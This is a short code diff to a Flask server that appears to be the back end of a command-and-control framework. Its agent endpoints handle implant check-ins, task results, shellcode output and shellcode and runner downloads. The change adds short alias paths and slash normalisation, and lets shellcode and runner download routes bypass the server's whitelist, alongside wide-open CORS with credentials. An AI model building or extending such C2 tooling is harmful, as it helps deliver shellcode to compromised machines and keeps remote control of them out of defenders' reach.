@@ -58,6 +58,17 @@ def create_app():
 
    
 
+    # Normalize consecutive slashes in PATH_INFO (e.g. //a/p -> /a/p)
+    _orig_wsgi_app = app.wsgi_app
+    def _normalize_slash_middleware(environ, start_response):
+        path_info = environ.get('PATH_INFO', '')
+        if '//' in path_info:
+            while '//' in path_info:
+                path_info = path_info.replace('//', '/')
+            environ['PATH_INFO'] = path_info
+        return _orig_wsgi_app(environ, start_response)
+    app.wsgi_app = _normalize_slash_middleware
+
     # Enable CORS for all domains
     CORS(app, resources={r"/*": {"origins": "*", "supports_credentials": True}})
 
@@ -95,6 +106,8 @@ def create_app():
         path = request.path
         # List of agent endpoints to bypass whitelist
         agent_endpoints = [
+            '/a/p',
+            '/a/d',
             '/api/checkin', 
             '/api/task_result', 
             '/api/shellcode_output', 
@@ -110,7 +123,7 @@ def create_app():
         
         is_agent_path = False
         for ep in agent_endpoints:
-            if path.endswith(ep):
+            if path.endswith(ep) or '/api/download_shellcode/' in path or '/api/download_runner/' in path:
                 is_agent_path = True
                 break
         
